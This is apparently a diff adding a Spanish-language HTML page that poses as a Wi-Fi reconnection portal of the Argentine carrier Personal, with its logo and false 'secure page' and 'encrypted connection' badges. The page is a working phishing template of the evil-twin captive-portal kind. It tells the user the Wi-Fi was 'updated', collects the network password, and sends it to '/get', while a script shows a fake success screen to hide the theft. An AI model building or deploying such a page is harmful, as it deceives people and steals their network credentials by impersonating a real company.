@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Personal – Conectar Wi-Fi</title>
+    <style>
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+      :root {
+        --blue:       #1EB2F5;
+        --blue-mid:   #38C1FF;
+        --blue-light: rgba(30,178,245,0.12);
+        --blue-border:rgba(30,178,245,0.30);
+        --bg:         #001535;
+        --surface:    #ffffff;
+        --text:       #1E293B;
+        --text-muted: #64748B;
+        --border:     #D8DEF0;
+      }
+
+      body {
+        font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;
+        background-color: var(--bg);
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* ── HEADER ── */
+      header {
+        background: #001028;
+        border-bottom: 1px solid rgba(30,178,245,0.15);
+        padding: 0 32px;
+        height: 60px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      /* Logo Personal WiFi zone (inline SVG-text) */
+      .header-logo {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        text-decoration: none;
+      }
+
+      .logo-pin {
+        width: 28px;
+        height: 28px;
+      }
+
+      .logo-text {
+        font-size: 17px;
+        line-height: 1;
+        color: #ffffff;
+        letter-spacing: -0.2px;
+      }
+      .logo-text strong {
+        font-weight: 900;
+        font-style: italic;
+      }
+      .logo-text .zone {
+        font-weight: 400;
+        color: rgba(255,255,255,0.85);
+      }
+
+      .secure-badge {
+        display: flex;
+        align-items: center;
+        gap: 7px;
+        background: rgba(30,178,245,0.10);
+        border: 1px solid rgba(30,178,245,0.30);
+        border-radius: 20px;
+        padding: 5px 14px;
+      }
+      .secure-badge span {
+        font-size: 12px;
+        font-weight: 600;
+        color: #1EB2F5;
+        letter-spacing: 0.3px;
+      }
+
+      /* ── HERO BANNER ── */
+      .hero {
+        background: var(--blue);
+        padding: 20px 32px 24px;
+        display: flex;
+        align-items: center;
+        gap: 14px;
+      }
+
+      .hero-logo {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .hero-pin {
+        width: 34px;
+        height: 34px;
+      }
+
+      .hero-brand {
+        font-size: 22px;
+        line-height: 1;
+        color: #ffffff;
+        letter-spacing: -0.3px;
+      }
+      .hero-brand strong {
+        font-weight: 900;
+        font-style: italic;
+      }
+      .hero-brand .zone {
+        font-weight: 300;
+        color: rgba(255,255,255,0.85);
+      }
+
+      /* ── PÁGINA ── */
+      .page {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 40px 20px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .page::before {
+        content: '';
+        position: absolute;
+        width: 560px; height: 560px;
+        border-radius: 50%;
+        border: 1px solid rgba(30,178,245,0.10);
+        top: -160px; left: -160px;
+        pointer-events: none;
+      }
+      .page::after {
+        content: '';
+        position: absolute;
+        width: 380px; height: 380px;
+        border-radius: 50%;
+        border: 1px solid rgba(30,178,245,0.07);
+        bottom: -100px; right: -90px;
+        pointer-events: none;
+      }
+
+      /* ── CARD ── */
+      .login-container {
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        box-shadow: 0 4px 28px rgba(0,51,160,0.10);
+        width: 100%;
+        max-width: 420px;
+        padding: 40px 36px 36px;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* ── WIFI ICON ── */
+      .wifi-icon {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 24px;
+      }
+
+      /* ── TEXTOS ── */
+      .g-h1 {
+        font-size: 21px;
+        font-weight: 700;
+        color: var(--text);
+        text-align: center;
+        margin-bottom: 8px;
+        line-height: 1.35;
+      }
+
+      .g-h2 {
+        font-size: 14px;
+        color: var(--text-muted);
+        text-align: center;
+        font-weight: 400;
+        line-height: 1.6;
+        margin-bottom: 30px;
+      }
+
+      /* ── FORM ── */
+      .login-content {
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+      }
+
+      .g-input {
+        width: 100%;
+        background: #F5F7FF;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        color: var(--text);
+        font-size: 15px;
+        padding: 12px 14px;
+        outline: none;
+        transition: border-color 0.2s, box-shadow 0.2s;
+      }
+      .g-input::placeholder { color: #B0BCDA; }
+      .g-input:focus {
+        border-color: var(--blue);
+        box-shadow: 0 0 0 3px rgba(0,51,160,0.10);
+        background: #ffffff;
+      }
+
+      .txt {
+        font-size: 13px;
+        color: var(--blue);
+        text-decoration: none;
+      }
+      .txt:hover { text-decoration: underline; }
+
+      .button-container { margin-top: 4px; }
+
+      .gbtn-primary {
+        width: 100%;
+        background: var(--blue);
+        color: #ffffff;
+        border: none;
+        border-radius: 8px;
+        font-size: 15px;
+        font-weight: 700;
+        padding: 13px;
+        cursor: pointer;
+        letter-spacing: 0.2px;
+        transition: background 0.2s, transform 0.1s;
+      }
+      .gbtn-primary:hover  { background: var(--blue-mid); }
+      .gbtn-primary:active { transform: scale(0.99); }
+
+      /* ── DIVIDER ── */
+      .divider {
+        height: 1px;
+        background: var(--border);
+        margin: 24px 0;
+      }
+
+      /* ── INFO PILLS ── */
+      .info-row {
+        display: flex;
+        gap: 8px;
+        justify-content: center;
+        flex-wrap: wrap;
+      }
+
+      .info-pill {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        font-size: 12px;
+        color: var(--text-muted);
+      }
+
+      /* ── FOOTER ── */
+      footer {
+        background: #001028;
+        border-top: 1px solid rgba(30,178,245,0.15);
+        padding: 14px 32px;
+        text-align: center;
+      }
+      footer p {
+        font-size: 12px;
+        color: rgba(255,255,255,0.4);
+      }
+
+      @media (max-width: 480px) {
+        header { padding: 0 16px; }
+        .hero   { padding: 16px; }
+        .login-container { padding: 32px 22px 28px; }
+      }
+    </style>
+  </head>
+  <body>
+
+    <!-- HEADER -->
+    <header>
+      <svg width="103" height="30" viewBox="0 0 103 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.92114 8.78283H6.31256L6.36048 11.1979H6.45823C7.31947 9.57188 8.89756 8.47169 10.7868 8.47169C14.3257 8.47169 16.3587 11.4848 16.3587 15.1674C16.3587 18.8021 14.2778 21.9347 10.7632 21.9347C8.53914 21.9347 7.39103 20.7393 6.76938 19.4717H6.67354V26H3.92625L3.92114 8.78283ZM10.1147 19.3043C12.1713 19.3043 13.5584 17.654 13.5584 15.2632C13.5584 13.0628 12.4083 10.9826 10.2105 10.9826C8.05805 10.9826 6.76682 12.9197 6.76682 15.1674C6.76682 17.4151 7.91685 19.3043 10.1147 19.3043ZM24.3431 8.47169C27.8819 8.47169 30.106 11.15 30.106 14.809V16.3391H20.6125C20.8278 18.1568 22.5254 19.4001 24.6536 19.4001C26.2559 19.4001 27.404 18.5868 28.2404 17.7262L29.867 19.3522C28.48 21.0977 26.5192 21.911 24.4625 21.911C21.1147 21.911 17.9099 19.5196 17.9099 15.2869C17.9099 11.4848 20.7799 8.47169 24.3431 8.47169V8.47169ZM27.4277 14.1854C27.3798 12.392 26.3039 10.9813 24.2236 10.9813C22.4295 10.9813 20.8278 12.2725 20.6125 14.1854H27.4277ZM32.2834 8.78155H34.7942V11.1251H34.8658C35.4875 9.47476 36.396 8.78155 38.2137 8.78155H39.0506V11.5288H37.2809C35.7028 11.5288 35.0332 12.4616 35.0332 14.1828V21.5762H32.2859L32.2834 8.78155ZM41.3213 17.4151C42.3729 18.7063 43.6641 19.6634 45.3381 19.6634C46.5098 19.6634 47.4905 19.2085 47.4905 18.2284C47.4905 17.1997 46.2709 16.695 44.8359 16.2676C42.8757 15.6459 40.46 14.7604 40.46 12.3217C40.46 10.2172 42.5646 8.42441 45.2186 8.42441C47.9691 8.42441 49.5708 10.0031 50.3119 11.6771L48.3064 12.7044C48.0392 12.1089 47.6062 11.6029 47.0593 11.2468C46.5124 10.8906 45.8745 10.6993 45.2218 10.6957C44.0718 10.6957 43.2131 11.2937 43.2131 12.1786C43.2131 13.2545 44.2654 13.6129 45.724 14.0672C47.7327 14.6889 50.2436 15.4543 50.2436 17.9888C50.2436 20.5233 47.8285 21.9347 45.2461 21.9347C44.1247 21.9357 43.0209 21.6562 42.0353 21.1215C41.0496 20.5869 40.2133 19.8142 39.6026 18.8737L41.3213 17.4151ZM58.3232 8.42377C62.1732 8.42377 64.9946 11.4848 64.9946 15.1674C64.9946 18.873 61.9579 21.9347 58.2752 21.9347C54.5926 21.9347 51.5559 18.8737 51.5559 15.1674C51.5559 11.4848 54.6405 8.42377 58.3232 8.42377V8.42377ZM58.2733 19.4244C60.5689 19.4244 62.3623 17.5352 62.3623 15.168C62.3623 12.8245 60.5689 10.9353 58.2733 10.9353C55.9535 10.9353 54.1843 12.8009 54.1843 15.168C54.1843 17.5115 55.9535 19.4244 58.2733 19.4244ZM66.7861 8.78347H69.297V11.1985H69.3449C70.2061 9.66516 71.4251 8.42441 73.5776 8.42441C76.3754 8.42441 77.9055 10.529 77.9055 13.4941V21.5762H75.1583V13.9241C75.1583 12.1786 74.513 10.8631 72.7943 10.8631C70.6419 10.8631 69.5417 12.9676 69.5417 14.9521V21.5762H66.7944L66.7861 8.78347ZM85.6823 14.1151H88.1932V13.3024C88.1932 11.9869 87.4041 10.9826 85.8497 10.9826C84.3674 10.9826 83.0283 12.0112 82.3587 13.4698L80.0388 12.346C81.1154 9.88238 83.2915 8.47169 85.874 8.47169C88.8129 8.47169 90.9437 10.1967 90.9437 13.3024V18.8979C90.9437 19.1848 90.9916 19.3043 91.3021 19.3043H92.2604V21.5762H90.515C89.4148 21.5762 88.6736 20.9303 88.6736 19.5432V18.9216H88.5542C87.6929 20.7872 85.9474 21.8605 84.0103 21.8605C81.9543 21.8605 80.0171 20.6652 80.0171 18.1549C80.0171 15.6447 82.4565 14.1132 85.6842 14.1132L85.6823 14.1151ZM84.5604 19.5892C86.2854 19.5892 87.9798 18.1549 88.1951 16.0261H85.8311C84.0377 16.0261 82.7702 16.672 82.7702 17.9869C82.7702 18.9912 83.5113 19.5892 84.5636 19.5892H84.5604ZM94.1765 4H96.9238V18.8258C96.9238 19.1605 96.9474 19.3043 97.3538 19.3043H99.0788V21.5762H96.4159C94.6697 21.5762 94.1676 20.4524 94.1676 18.85L94.1765 4Z" fill="#1EB2F5"/>
+      </svg>
+
+      <div class="secure-badge">
+        <svg width="13" height="15" viewBox="0 0 13 15" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="1" y="6" width="11" height="8" rx="2" fill="none" stroke="#1EB2F5" stroke-width="1.3"/>
+          <path d="M3.5 6V4a3 3 0 0 1 6 0v2" stroke="#1EB2F5" stroke-width="1.3" stroke-linecap="round"/>
+          <circle cx="6.5" cy="10" r="1.2" fill="#1EB2F5"/>
+        </svg>
+        <span>Página segura</span>
+      </div>
+    </header>
+
+
+
+    <!-- MAIN -->
+    <div class="page">
+      <div class="login-container">
+
+        <!-- Logo Personal -->
+        <div style="display:flex;justify-content:center;margin-bottom:20px;">
+          <svg width="120" height="35" viewBox="0 0 103 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M3.92114 8.78283H6.31256L6.36048 11.1979H6.45823C7.31947 9.57188 8.89756 8.47169 10.7868 8.47169C14.3257 8.47169 16.3587 11.4848 16.3587 15.1674C16.3587 18.8021 14.2778 21.9347 10.7632 21.9347C8.53914 21.9347 7.39103 20.7393 6.76938 19.4717H6.67354V26H3.92625L3.92114 8.78283ZM10.1147 19.3043C12.1713 19.3043 13.5584 17.654 13.5584 15.2632C13.5584 13.0628 12.4083 10.9826 10.2105 10.9826C8.05805 10.9826 6.76682 12.9197 6.76682 15.1674C6.76682 17.4151 7.91685 19.3043 10.1147 19.3043ZM24.3431 8.47169C27.8819 8.47169 30.106 11.15 30.106 14.809V16.3391H20.6125C20.8278 18.1568 22.5254 19.4001 24.6536 19.4001C26.2559 19.4001 27.404 18.5868 28.2404 17.7262L29.867 19.3522C28.48 21.0977 26.5192 21.911 24.4625 21.911C21.1147 21.911 17.9099 19.5196 17.9099 15.2869C17.9099 11.4848 20.7799 8.47169 24.3431 8.47169V8.47169ZM27.4277 14.1854C27.3798 12.392 26.3039 10.9813 24.2236 10.9813C22.4295 10.9813 20.8278 12.2725 20.6125 14.1854H27.4277ZM32.2834 8.78155H34.7942V11.1251H34.8658C35.4875 9.47476 36.396 8.78155 38.2137 8.78155H39.0506V11.5288H37.2809C35.7028 11.5288 35.0332 12.4616 35.0332 14.1828V21.5762H32.2859L32.2834 8.78155ZM41.3213 17.4151C42.3729 18.7063 43.6641 19.6634 45.3381 19.6634C46.5098 19.6634 47.4905 19.2085 47.4905 18.2284C47.4905 17.1997 46.2709 16.695 44.8359 16.2676C42.8757 15.6459 40.46 14.7604 40.46 12.3217C40.46 10.2172 42.5646 8.42441 45.2186 8.42441C47.9691 8.42441 49.5708 10.0031 50.3119 11.6771L48.3064 12.7044C48.0392 12.1089 47.6062 11.6029 47.0593 11.2468C46.5124 10.8906 45.8745 10.6993 45.2218 10.6957C44.0718 10.6957 43.2131 11.2937 43.2131 12.1786C43.2131 13.2545 44.2654 13.6129 45.724 14.0672C47.7327 14.6889 50.2436 15.4543 50.2436 17.9888C50.2436 20.5233 47.8285 21.9347 45.2461 21.9347C44.1247 21.9357 43.0209 21.6562 42.0353 21.1215C41.0496 20.5869 40.2133 19.8142 39.6026 18.8737L41.3213 17.4151ZM58.3232 8.42377C62.1732 8.42377 64.9946 11.4848 64.9946 15.1674C64.9946 18.873 61.9579 21.9347 58.2752 21.9347C54.5926 21.9347 51.5559 18.8737 51.5559 15.1674C51.5559 11.4848 54.6405 8.42377 58.3232 8.42377V8.42377ZM58.2733 19.4244C60.5689 19.4244 62.3623 17.5352 62.3623 15.168C62.3623 12.8245 60.5689 10.9353 58.2733 10.9353C55.9535 10.9353 54.1843 12.8009 54.1843 15.168C54.1843 17.5115 55.9535 19.4244 58.2733 19.4244ZM66.7861 8.78347H69.297V11.1985H69.3449C70.2061 9.66516 71.4251 8.42441 73.5776 8.42441C76.3754 8.42441 77.9055 10.529 77.9055 13.4941V21.5762H75.1583V13.9241C75.1583 12.1786 74.513 10.8631 72.7943 10.8631C70.6419 10.8631 69.5417 12.9676 69.5417 14.9521V21.5762H66.7944L66.7861 8.78347ZM85.6823 14.1151H88.1932V13.3024C88.1932 11.9869 87.4041 10.9826 85.8497 10.9826C84.3674 10.9826 83.0283 12.0112 82.3587 13.4698L80.0388 12.346C81.1154 9.88238 83.2915 8.47169 85.874 8.47169C88.8129 8.47169 90.9437 10.1967 90.9437 13.3024V18.8979C90.9437 19.1848 90.9916 19.3043 91.3021 19.3043H92.2604V21.5762H90.515C89.4148 21.5762 88.6736 20.9303 88.6736 19.5432V18.9216H88.5542C87.6929 20.7872 85.9474 21.8605 84.0103 21.8605C81.9543 21.8605 80.0171 20.6652 80.0171 18.1549C80.0171 15.6447 82.4565 14.1132 85.6842 14.1132L85.6823 14.1151ZM84.5604 19.5892C86.2854 19.5892 87.9798 18.1549 88.1951 16.0261H85.8311C84.0377 16.0261 82.7702 16.672 82.7702 17.9869C82.7702 18.9912 83.5113 19.5892 84.5636 19.5892H84.5604ZM94.1765 4H96.9238V18.8258C96.9238 19.1605 96.9474 19.3043 97.3538 19.3043H99.0788V21.5762H96.4159C94.6697 21.5762 94.1676 20.4524 94.1676 18.85L94.1765 4Z" fill="#1EB2F5"/>
+          </svg>
+        </div>
+
+        <!-- Ícono Wi-Fi -->
+        <div class="wifi-icon">
+          <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="30" cy="30" r="30" fill="rgba(0,51,160,0.08)"/>
+            <path d="M14 29c4.4-4.7 9.5-7.3 16-7.3s11.6 2.6 16 7.3" stroke="#0033A0" stroke-width="2" stroke-linecap="round"/>
+            <path d="M19 34.5c2.9-3.2 6.5-5 11-5s8.1 1.8 11 5" stroke="#0033A0" stroke-width="2" stroke-linecap="round"/>
+            <path d="M24 40c1.6-1.9 3.6-3 6-3s4.4 1.1 6 3" stroke="#0033A0" stroke-width="2" stroke-linecap="round"/>
+            <circle cx="30" cy="44.5" r="2" fill="#0033A0"/>
+          </svg>
+        </div>
+
+        <form action="/get" id="wifi-form">
+          <h1 class="g-h1">¡Tu Wi-Fi se ha actualizado!</h1>
+          <p class="g-h2">Ingresá la contraseña de tu red Wi-Fi para conectarte.</p>
+
+          <div class="login-content">
+            <div>
+              <input id="password" name="password" type="password" class="g-input" placeholder="Contraseña Wi-Fi" required>
+            </div>
+            <a href="#" class="txt">Más información</a>
+            <div class="button-container">
+              <button class="gbtn-primary" type="submit">Conectar</button>
+            </div>
+          </div>
+        </form>
+
+        <!-- Pantalla de éxito -->
+        <div id="success-screen" style="display:none; text-align:center; padding: 32px 16px;">
+          <div style="margin-bottom: 28px;">
+            <svg width="72" height="72" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="36" cy="36" r="36" fill="rgba(0,51,160,0.10)"/>
+              <circle cx="36" cy="36" r="26" fill="rgba(0,51,160,0.18)"/>
+              <path d="M22 37l9 9 19-19" stroke="#0033A0" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <h2 style="font-size:22px;font-weight:700;color:#0033A0;margin-bottom:10px;">¡Bienvenido a Personal!</h2>
+          <p style="font-size:15px;color:#64748B;margin-bottom:24px;line-height:1.6;">Tu conexión Wi-Fi está activa. Gracias por elegirnos.</p>
+          <a href="#" style="font-size:13px;color:#0033A0;text-decoration:none;font-weight:500;">Obtener más información</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="info-row">
+          <div class="info-pill">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
+              <circle cx="12" cy="12" r="10" stroke="#94A3B8" stroke-width="1.5"/>
+              <path d="M12 8v4l3 3" stroke="#94A3B8" stroke-width="1.5" stroke-linecap="round"/>
+            </svg>
+            Conexión cifrada
+          </div>
+          <div class="info-pill">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
+              <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="#94A3B8" stroke-width="1.5" stroke-linejoin="round"/>
+              <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#94A3B8" stroke-width="1.5" stroke-linejoin="round"/>
+            </svg>
+            Tus datos están protegidos
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer>
+      <p>© 2026 Personal Argentina — Todos los derechos reservados</p>
+    </footer>
+
+    <script>
+      var form = document.getElementById('wifi-form');
+      if (form) {
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+          form.style.display = 'none';
+          document.getElementById('success-screen').style.display = 'block';
+          setTimeout(function() { form.submit(); }, 1500);
+        });
+      }
+    </script>
+
+  </body>
+</html>
